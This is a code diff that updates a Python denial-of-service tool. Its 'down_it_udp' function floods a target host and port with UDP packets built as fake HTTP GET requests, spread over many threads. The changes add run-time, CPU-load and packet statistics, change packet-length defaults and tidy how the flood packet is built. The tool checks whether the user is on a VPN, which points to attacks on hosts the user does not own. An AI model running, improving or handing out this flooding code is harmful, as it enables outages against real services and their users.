@@ -1,3 +1,4 @@
+import os
 import random
 import socket
 import string
@@ -7,8 +8,9 @@ import threading
 import time
 import urllib.request
 from dataclasses import dataclass, field
+from datetime import datetime
 from optparse import OptionParser
-from os import cpu_count
+
 
 # Constants
 USAGE = 'Usage: python %prog [options] arg'
@@ -28,7 +30,7 @@ class Context:
     host: str = ''
     port: int = 80
     threads: int = 100
-    max_random_packet_len: int = 5000
+    max_random_packet_len: int = 0
     random_packet_len: bool = False
     attack_method: str = None
     protocol: str = 'http://'
@@ -40,6 +42,7 @@ class Context:
     headers = None
 
     # Statistic
+    start_time: datetime = None
     start_ip: str = ''
     packets_sent: int = 0
     connections_success: int = 0
@@ -66,11 +69,12 @@ def init_context(_ctx, args):
     _ctx.attack_method = str(args[0].attack_method).lower()
     _ctx.random_packet_len = bool(args[0].random_packet_len)
     _ctx.max_random_packet_len = int(args[0].max_random_packet_len)
-    _ctx.cpu_count = max(cpu_count() - 1, 1)
+    _ctx.cpu_count = max(os.cpu_count(), 1)  # to avoid situation when vCPU might be 0
 
     _ctx.user_agents = readfile('useragents.txt')
     _ctx.base_headers = readfile('headers.txt')
     _ctx.headers = set_headers_dict(_ctx.base_headers)
+    _ctx.start_time = datetime.now()
 
 
 def readfile(filename: str):
@@ -110,16 +114,8 @@ def down_it_udp(_ctx: Context):
     i = 1
     while True:
         extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
-
-        packet = str(
-            "GET / HTTP/1.1\nHost: " + _ctx.host
-            + "\n\n User-Agent: "
-            + random.choice(_ctx.user_agents)
-            + "\n" + _ctx.base_headers[0]
-            + "\n\n" + extra_data).encode('utf-8')
-
+        packet = f'GET / HTTP/1.1\nHost: {_ctx.host}\n\n User-Agent: {random.choice(_ctx.user_agents)}\n{_ctx.base_headers[0]}\n\n{extra_data}'.encode('utf-8')
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # p = int(_ctx.port) if _ctx.port else get_random_port()
 
         try:
             sock.sendto(packet, (_ctx.host, _ctx.port))
@@ -215,10 +211,10 @@ def parser_add_options(parser):
                       help='threads (default: 100)')
     parser.add_option('-r', '--random_len',
                       dest='random_packet_len', type='int', default=1,
-                      help='Send random packets with random length')
+                      help='Send random packets with random length (default: 1')
     parser.add_option('-l', '--max_random_packet_len',
-                      dest='max_random_packet_len', type='int', default=5000,
-                      help='Send random packets with random length')
+                      dest='max_random_packet_len', type='int', default=48,
+                      help='Max random packets length (default: 48)')
     parser.add_option('-m', '--method',
                       dest='attack_method', type='str', default='udp',
                       help='Attack method: udp (default), http')
@@ -273,10 +269,11 @@ def show_info(_ctx: Context):
     load_method = f'\033[94m{str(_ctx.attack_method).upper()}\033[0m'
     thread_pool = f'\033[94m{_ctx.threads}\033[0m'
     available_cpu = f'\033[94m{_ctx.cpu_count}\033[0m'
-    rnd_packet_len = f'\033[94mYES\033[0m' if (is_random_packet_len) else f'\033[94mNO\033[0m'
-    max_rnd_packet_len = f'\033[94m{_ctx.max_random_packet_len}\033[0m' if (is_random_packet_len) else f'\033[94mNOT REQUIRED\033[0m'
+    rnd_packet_len = f'\033[94mYES\033[0m' if is_random_packet_len else f'\033[94mNO\033[0m'
+    max_rnd_packet_len = f'\033[94m{_ctx.max_random_packet_len}\033[0m' if is_random_packet_len else f'\033[94mNOT REQUIRED\033[0m'
 
     print('------------------------------------------------------')
+    print(f'Start time:                 {_ctx.start_time.strftime("%Y-%m-%d %H:%M:%S")}')
     print(f'Your IP:                    {your_ip} {check_vpn}')
     print(f'Host:                       {target_host}')
     print(f'Load Method:                {load_method}')
@@ -304,11 +301,15 @@ def show_statistics(_ctx: Context):
     print("\033c")
     show_info(_ctx)
 
-    packets_sent = f'\033[94m{_ctx.packets_sent}\033[0;0m'
     connections_success = f'\033[92m{_ctx.connections_success}\033[0;0m'
     connections_failed = f'\033[91m{_ctx.connections_failed}\033[0;0m'
+    load1, load5, load15 = os.getloadavg()
+    cpu_usage = (load15 / os.cpu_count()) * 100
+    curr_time = datetime.now() - _ctx.start_time
 
-    print(f'Packets Sent:               {packets_sent}')
+    print(f'Duration:                   {str(curr_time).split(".", 2)[0]}')
+    print(f'CPU usage:                  {cpu_usage:.2f}%')
+    print(f'Packets Sent:               {_ctx.packets_sent}')
     print(f'Connection Success:         {connections_success}')
     print(f'Connection Failed:          {connections_failed}')
     print('------------------------------------------------------')
@@ -399,7 +400,6 @@ def main():
     check_host(_ctx.host)
     connect_host(_ctx)
 
-    # p = str(_port) if _port else '(22, 53, 80, 443)'
     print("\033[92m", _ctx.host, " port: ", _ctx.port, " threads: ", _ctx.threads, "\033[0m")
     print("\033[94mPlease wait...\033[0m")
 
